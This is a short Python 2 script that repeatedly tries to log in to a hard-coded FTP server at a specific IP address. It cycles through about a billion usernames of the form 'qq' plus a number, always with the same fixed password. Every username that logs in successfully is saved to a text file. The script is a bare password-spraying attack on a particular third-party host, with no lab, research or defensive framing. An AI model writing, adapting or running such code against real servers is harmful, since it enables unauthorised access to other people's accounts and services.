# -*- coding: UTF-8 -*-
from ftplib import FTP
ftp = FTP()
ftp.set_pasv(0)
ftp.connect('119.28.50.82', '21')
i = 1007347363
filename = 'userid.txt'
while i <= 2000000000:
    user = "qq" + str(i)
    try:
        ftplog = ftp.login(user, '12345678x')
    except:
        print i
        i=i + 1
    else:
        ftp.close()
        with open(filename, 'a') as f:
            f.write(user+'\n')
        del ftplog